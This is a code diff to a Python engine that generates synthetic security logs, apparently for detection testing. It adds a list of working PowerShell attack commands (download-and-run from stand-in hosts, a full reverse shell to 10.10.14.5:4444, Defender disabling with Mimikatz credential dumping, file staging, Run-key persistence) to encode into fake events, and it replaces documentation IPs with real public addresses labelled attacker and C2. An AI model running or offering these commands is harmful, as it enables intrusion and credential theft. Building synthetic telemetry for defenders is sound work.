@@ -5,6 +5,7 @@ It coordinates StateManager, emitters, and activity generation to produce
 consistent synthetic security logs across multiple formats.
 """
 
+import base64
 import logging
 import math
 import random
@@ -241,6 +242,12 @@ class GenerationEngine:
 
         # Set initial state manager time
         self.state_manager.set_current_time(self.start_time)
+
+        # Phase 6.3: Resolve AD domain for FQDNs and domain name fields
+        self._ad_domain = self._resolve_ad_domain()
+        self._netbios_domain = self._ad_domain.split('.')[0].upper() if self._ad_domain else 'CORP'
+        self.activity_generator._ad_domain = self._ad_domain
+        self.activity_generator._netbios_domain = self._netbios_domain
 
         # Phase 5.4: Pre-seed system process trees and detect infrastructure IPs
         self._infra_ips = self._detect_infrastructure_ips()
@@ -782,10 +789,24 @@ class GenerationEngine:
         - Tracking of malicious events for ground truth
         """
         total_events = len(self.scenario.storyline)
+        # Phase 6.3: Track previous event time for causal ordering with jitter
+        _prev_event_time = None
 
         for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
-            # Parse event time
+            # Parse event time and add realistic jitter (±0-30s + microseconds)
             event_time = self._parse_storyline_time(storyline_event.time)
+            jitter_rng = random.Random(hash(f"jitter_{event_num}_{self.scenario.name}"))
+            jitter = timedelta(
+                seconds=jitter_rng.uniform(-30, 30),
+                microseconds=jitter_rng.randint(0, 999999),
+            )
+            event_time = event_time + jitter
+            # Enforce causal ordering: must be after previous event
+            if _prev_event_time and event_time <= _prev_event_time:
+                event_time = _prev_event_time + timedelta(
+                    milliseconds=jitter_rng.randint(100, 5000)
+                )
+            _prev_event_time = event_time
 
             # Find actor and system
             actor = self._find_actor(storyline_event.actor)
@@ -930,7 +951,9 @@ class GenerationEngine:
         }
 
         if event_type == 'logon':
-            source_ip = details.get('source_ip', '203.0.113.50')  # Default attacker IP
+            # Default attacker IPs: realistic hosting/VPN ranges (not RFC 5737)
+            _attacker_ips = ['45.33.32.156', '185.220.101.34', '91.219.236.174', '23.129.64.210', '116.202.120.181']
+            source_ip = details.get('source_ip', random.choice(_attacker_ips))
             logon_id = self.activity_generator.generate_logon(
                 user=actor,
                 system=system,
@@ -954,6 +977,13 @@ class GenerationEngine:
             process_name = details.get('process_name', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')
             command_line = details.get('command_line', 'powershell.exe -enc <base64_encoded_command>')
 
+            # Replace base64 placeholder with actual encoded command
+            if '<base64_encoded_command>' in command_line:
+                command_line = command_line.replace(
+                    '<base64_encoded_command>',
+                    self._generate_encoded_powershell(hash(f"{time}_{actor.username}"))
+                )
+
             parent_pid = self.activity_generator._select_parent_pid(system, actor, process_name)
             pid = self.activity_generator.generate_process(
                 user=actor,
@@ -971,7 +1001,9 @@ class GenerationEngine:
             malicious_event['pid'] = pid
 
         elif event_type == 'connection':
-            dst_ip = details.get('dst_ip', '198.51.100.10')  # Default C2 server IP
+            # Default C2 IPs: realistic cloud hosting ranges (not RFC 5737)
+            _c2_ips = ['159.65.43.201', '134.209.29.115', '167.71.156.88', '64.227.38.102', '108.61.13.174']
+            dst_ip = details.get('dst_ip', random.choice(_c2_ips))
             dst_port = details.get('dst_port', 443)
             service = details.get('service', 'https')
 
@@ -981,7 +1013,7 @@ class GenerationEngine:
                     f"Skipping storyline connection: dst_ip {dst_ip} matches system IP {system.ip}. "
                     f"Adjusting to external IP."
                 )
-                dst_ip = '198.51.100.10'  # Force to external IP
+                dst_ip = random.choice(['159.65.43.201', '134.209.29.115', '167.71.156.88'])
 
             uid = self.activity_generator.generate_connection(
                 src_ip=system.ip,
@@ -1114,16 +1146,31 @@ class GenerationEngine:
             'SYSTEM': 'S-1-5-18',
             'LOCAL SERVICE': 'S-1-5-19',
             'NETWORK SERVICE': 'S-1-5-20',
+            # Well-known domain RIDs
+            'Administrator': f"{base_sid}-500",
+            'Guest': f"{base_sid}-501",
+            'krbtgt': f"{base_sid}-502",
         }
 
-        # Assign per-user RIDs starting at 1001
-        for i, user in enumerate(self.scenario.environment.users):
-            registry[user.username] = f"{base_sid}-{1001 + i}"
+        # Assign per-user RIDs starting at 1001 with random gaps (realistic)
+        rid = 1001
+        for user in self.scenario.environment.users:
+            registry[user.username] = f"{base_sid}-{rid}"
+            rid += rng.randint(1, 5)  # Random gap simulates deleted accounts
 
-        # Also assign SIDs for service accounts
-        for j, svc in enumerate(self.scenario.environment.service_accounts):
+        # Computer account SIDs (hostname$)
+        comp_rid = max(rid + 10, 1100)  # Start computer RIDs after user RIDs
+        for system in self.scenario.environment.systems:
+            machine_name = f"{system.hostname}$"
+            registry[machine_name] = f"{base_sid}-{comp_rid}"
+            comp_rid += rng.randint(1, 3)
+
+        # Service account SIDs
+        svc_rid = max(comp_rid + 10, 2001)
+        for svc in self.scenario.environment.service_accounts:
             if svc not in registry:
-                registry[svc] = f"{base_sid}-{2001 + j}"
+                registry[svc] = f"{base_sid}-{svc_rid}"
+                svc_rid += rng.randint(1, 3)
 
         logger.info(f"Built SID registry: {len(registry)} entries (domain: {base_sid})")
         return registry
@@ -1148,6 +1195,45 @@ class GenerationEngine:
         'postgres': (5432, 'postgresql'),
         'postgresql': (5432, 'postgresql'),
     }
+
+    # Realistic decoded PowerShell commands for base64 encoding
+    _POWERSHELL_COMMANDS = [
+        "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
+        "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
+        "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
+        "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
+        "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
+        "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
+        "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
+        "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
+        "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
+        "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
+    ]
+
+    def _generate_encoded_powershell(self, seed: int) -> str:
+        """Generate a realistic base64-encoded PowerShell command.
+
+        PowerShell -enc expects UTF-16LE encoded base64.
+        """
+        rng = random.Random(hash(f"ps_enc_{seed}_{self.scenario.name}"))
+        cmd = rng.choice(self._POWERSHELL_COMMANDS)
+        return base64.b64encode(cmd.encode('utf-16-le')).decode('ascii')
+
+    def _resolve_ad_domain(self) -> str:
+        """Resolve Active Directory domain FQDN from scenario.
+
+        Priority: environment.domain > inferred from user emails > 'corp.local'
+        """
+        env = self.scenario.environment
+        if env.domain:
+            return env.domain
+        # Infer from first user email with a domain
+        for user in env.users:
+            if user.email and '@' in user.email:
+                email_domain = user.email.split('@', 1)[1]
+                if '.' in email_domain:
+                    return email_domain
+        return 'corp.local'
 
     def _detect_infrastructure_ips(self) -> dict[str, str | list]:
         """Detect infrastructure IPs from scenario systems.
@@ -1714,14 +1800,25 @@ class GenerationEngine:
                         ]),
                     })
                 else:
-                    # systemd-timesyncd
+                    # systemd-timesyncd: "for the first time" only once per system
                     ntp_ip = rng.choice(['91.189.89.198', '91.189.89.199', '91.189.94.4'])
+                    if not hasattr(self, '_timesyncd_first_seen'):
+                        self._timesyncd_first_seen = set()
+                    if system.hostname not in self._timesyncd_first_seen:
+                        msg = f'Synchronized to time server for the first time {ntp_ip}:123 (ntp.ubuntu.com).'
+                        self._timesyncd_first_seen.add(system.hostname)
+                    else:
+                        msg = rng.choice([
+                            f'Initial synchronization to time server {ntp_ip}:123 (ntp.ubuntu.com).',
+                            f'Timed out waiting for reply from {ntp_ip}:123 (ntp.ubuntu.com).',
+                            f'Synchronized to time server {ntp_ip}:123 (ntp.ubuntu.com).',
+                        ])
                     self.emitters['syslog'].emit_event({
                         'timestamp': ts, 'hostname': system.hostname,
                         'app_name': 'systemd-timesyncd',
                         'pid': sys_pids.get('timesyncd', rng.randint(400, 800)),
                         'facility': 3, 'severity': 6,
-                        'message': f'Synchronized to time server for the first time {ntp_ip}:123 (ntp.ubuntu.com).',
+                        'message': msg,
                     })
 
         # Phase 5.3: ICMP ping between systems on same subnet (1-3 per hour), evenly spaced
